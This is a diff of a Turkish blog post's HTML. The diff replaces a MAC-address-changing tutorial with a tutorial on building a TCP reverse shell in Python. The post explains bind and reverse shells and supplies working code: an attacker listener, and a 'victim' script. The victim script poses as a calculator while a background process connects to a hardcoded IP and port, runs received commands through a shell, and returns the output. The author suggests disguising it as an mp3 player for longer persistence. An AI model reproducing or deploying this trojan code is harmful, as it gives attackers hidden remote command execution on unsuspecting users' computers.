@@ -105,34 +105,55 @@
 
                                 <!-- Post Headline Start -->
                                 <div class="post-title">
-                                    <h1>Python ile Mac Adressi Değiştirme!!!</h1>
+                                    <h1>Python ile TCP Reverse Shell Yapma !!!</h1>
                                    </div>
                                    <!-- Post Headline End -->
                                     
                                     
                                 <!-- Post Detail Start -->
                                 <div class="post-info">
-                                    <span>Mayıs 4, 2018 / by <a href="#" target="_blank">Erdem Yıldız</a></span>
+                                    <span>Mayıs 5, 2018 / by <a href="#" target="_blank">Erdem Yıldız</a></span>
                                 </div>
                                 <!-- Post Detail End -->
                                 <!-- İçerik -->
                                 <div class="yazı-kısmı">
                                     <p>
-                                        Merhaba arkadaşlar bugün python ile yazmış olduğum script'te verdiğiniz network aygıtı üzerinde
-                                        local tabanlı mac adresini değiştiren script'in amacını , kodlarını
+                                        Merhaba arkadaşlar bugün python ile yazmış olduğum script'te verdiğiniz sabit ip adresini ve port bilgisini
+                                        alarak bir server oluşturup diğer bilgisayar üzerinde komut çalıştırabilen script'in amacını , kodlarını
                                         ve video ile kullanımı göstereceğim.<span style="font-weight: bold">Haydi bir giriş yapalım...</span>
                                     </p>
 
+                                    <!-- Reverse Shell  İle alakı bir fotoğraf vardır-->
+                                     <div class="post-image margin-top-40 margin-bottom-40">
+                                      <img src="../images/Blog%20Picture/reverse-shell.png" alt="">
+                                    </div>
+
+                                    <p>
+                                        Script'in çalışma mantığını anlatmanda önce Normal shell(bind) ile Reverse shell'den bahsetmek istiyorum.
+                                        <p><b>Normal(bind) shell :</b> Hedef makine saldırganın seçtiği bir portu kendi üzerinde gelen istekleri karşılık veren
+                                        bir dinleyici çalıştırır.Daha sonra saldırgan açılan dinleyici bağlanarak üzerinde kod çalışmasıdır.Bu senaryo
+                                        NAT'lanan networkler arkasında çalışmamaktadır.
+                                        </p>
+
+                                        <p><b>Reverse shell :</b> Saldırgan daha önce belirlediği ip addresi ve port bilgisini kullanarak kendi makinası üzerinde
+                                            bir server çalıştırır.<b>(</b>Ip ve Port bilgisi hedef makine üzerinde daha önceden ayarlanmalıdr.<b>)</b>.Daha sonra hedef bu kurmuş olduğumuz server'a bağlanma istediği gönderir.Bu işlemden sonra hedef üzerinde
+                                        kod çalıştırabiliriz.
+                                        </p>
+                                    </p>
+
+
                                     <p>
                                         <span style="margin-left: 20px">
-                                            Arkadaşlar bu scripteki amacım şuydu.Local tabanlı saldırı yapacağımız zaman gizlenme konusu
-                                            üzerinde neler yapabilirim sorusuna mac adres değiştirme cevabını buldum.Bu yüzden bu
-                                            amaç üzerinde bir script yazmak istedim.Basitçe script sizden network aygıt adı isteyecek ve
-                                            rasgele bir mac adresi üretecektir.Üretme işleminden sonra script çalışmaya devam edecektir.
-                                            Bu süre zarfında herhangi bir şekilde internette çıkamıyorsunuz.Local tabanlı gizlenme işleminizi
-                                            bitirdiğinizde "Ctrl + C " tuş'larına basarak ilk başta  script'e verdiğiniz network aygıtını tekrar
-                                            başlatıp devamında script sonlanacaktir.(Bu script tahminimce Ubuntu üzerinde çalışmaktadır.Diğer
-                                            linux dağıtımlar üzerinde denemedim)
+                                            Arkadaşlar bu scripteki amacım şuydu.Yerine göre local tabanlı yerine göre global ağ tabanlı bir saldırı senaryosu
+                                            gerçekleştirmek istedim.Bu yüzden Reverse shell üzerine bir uygulama yapmak istedim.Kod'larda görebileceğiniz gibi hedef
+                                            makine bize daha önceden belirlenmiş bir ip-port bilgisi kullanarak bir istek atacak.Kendi bilgisayarımızda açılacak socket ile
+                                            hedef'in bağlandı socket aynı olması gerekiyor.Hedef açtığımız socket'e başarılı bir şekilde bağlandığında artık kendi makinamız
+                                            üzerinden hedef üzerinde komut çalıştırabileceğiz.Bu senaryonun biraz daha kapalı olması için hedef python tabanli bir hesap makinası
+                                            çalıştırır fakat arka planda aynı script üzerinde bir process çalıştırılır.Bu process sayesinde bilgisayarımıza bağlanma istediği gelir ve bizden
+                                            gelen mesajları arka planda çalıştırır sonuçlarını yine bize gönderir.Bu saldırı kullanıcı hesap makinesini kapatana kadar gerçekleşir.
+                                            <b>(</b>Burada ben hedef için hesap makinesi yaptım.Fakat bu mp3 player tarzı şeylerle değiştirilip socket'in daha uzun ömürlü
+                                            kullanılması sağlanabilir<b>)</b>
+
                                         </span>
                                     </p>
 
@@ -150,55 +171,93 @@
                                     <!-- Post Coding  Start -->
                                     <div class="margin-top-40 margin-bottom-40">
                                         <pre class="brush: js">
-                                        # ChangeMac.py
+                                        # Attacker.py
                                         # -*- coding:utf-8 -*-
-                                        import os
-                                        import random
-                                        import time
-                                        from scapy.all import *
+                                        import socket
+                                        import subprocess
+                                        import sys
 
-                                        def GetHEX():
-                                            tmp = "0123456789abcdef"
-                                            return random.choice(tmp) +""+ random.choice(tmp)
+                                        host = sys.argv[1]
+                                        port = int(sys.argv[2])
+                                        s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
+                                        s.bind((host , port))
+                                        s.listen(100)
+                                        conn , addr = s.accept()
+                                        print "[+] Bağlandı kuruldu {}".format(addr[0])
 
-                                        def GetMAC():
-                                            arr = ["02","00","00"]
-                                            for i in range(3):
-                                                arr.append(GetHEX())
-                                            arr = ":".join(arr)
-                                            return arr
-
-                                        def DefaultMAC(interface):
-                                            dMAC = ""
-                                            path = "/sys/class/net/{}/address".format(interface)
-                                            with open(path,"r") as file:
-                                                dMAC = str(file.readlines())[2:-4]
-                                            return dMAC
-
-                                        def ChangeMAC(interface,mac):
-                                            os.system("sudo ip link set {} down".format(interface))
-                                            time.sleep(3)
-                                            os.system("sudo ifconfig {} hw ether {}".format(interface, mac) )
-                                            time.sleep(3)
-                                            os.system("sudo ip link set {} up".format(interface))
-                                            print "Mac address is changed --> " + mac
-                                            print "After you press CTRL+C this app will close and your network device will connect again own network. "
-                                        if __name__ == "__main__":
-
-                                            interface = raw_input("[*] Please enter the network interface name  :")
-
-                                            newMAC = GetMAC()
-                                            dMAC = DefaultMAC(interface)
-                                            print "Created MAC : "+newMAC
-                                            print "Default MAC : "+dMAC
+                                        while 1 :
                                             try:
-                                                ChangeMAC(interface,newMAC)
-                                                time.sleep(2222222)
+                                                command = raw_input("#>")
+                                                if command != "exit":
+                                                    if command == "":
+                                                        continue
+                                                    conn.send(command)
+                                                    result = conn.recv(4096)
+                                                    print result
+
                                             except KeyboardInterrupt:
-                                                os.system("sudo /etc/init.d/network-manager stop")
-                                                    os.system("sudo /etc/init.d/network-manager start")
+                                                conn.send("exit()")
+                                                break
+                                        s.close()
 
 
+
+                                        </pre>
+                                    </div>
+
+                                    <div class="margin-top-40 margin-bottom-40">
+                                        <pre class="brush: js">
+                                        # Victim.py
+                                        # -*- coding:utf-8 -*-
+                                        import subprocess
+                                        import sys
+                                        import socket
+                                        from multiprocessing import Process
+
+                                        def start():
+                                            host = "192.168.1.21"
+                                            port = 8888
+
+                                            try:
+                                                s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
+                                                s.connect((host , port))
+                                            except:
+                                                s.close()
+                                            while True:
+                                                try:
+                                                    command = str(s.recv(4096))
+                                                    if command != "exit()":
+                                                        run = subprocess.Popen(command , shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE ,stderr=subprocess.PIPE)
+                                                        tmp = run.stdout.read() + run.stderr.read()
+                                                        s.send(tmp)
+                                                    else:
+                                                        break
+                                                except KeyboardInterrupt:
+                                                    break
+
+                                            s.close()
+
+
+                                        def calc():
+                                            ask = raw_input("[+,-,*,/]Yapılacak işlemi giriniz :")
+                                            s1  = input("1.sayı :")
+                                            s2  = input("2.sayı :")
+                                            if   ask == "+":
+                                                print s1+s2
+                                            elif ask == "-":
+                                                print s1-s2
+
+                                        if __name__ =="__main__":
+
+                                            p = Process(target=start)
+                                            p.start()
+
+                                            while 1:
+                                                try:
+                                                    calc()
+                                                except KeyboardInterrupt:
+                                                    p.terminate()
+                                                    break;
 
 
                                         </pre>
@@ -206,7 +265,7 @@
 
                                     <!-- Video kısmı-->
                                     <div class="video">
-                                        <iframe width="100%" height="315" src="https://www.youtube.com/embed/6Ar9EVY-Awg" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+                                        <iframe width="100%" height="315" src="https://www.youtube.com/embed/ap93Slc_770" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
 
                                     </div>
 
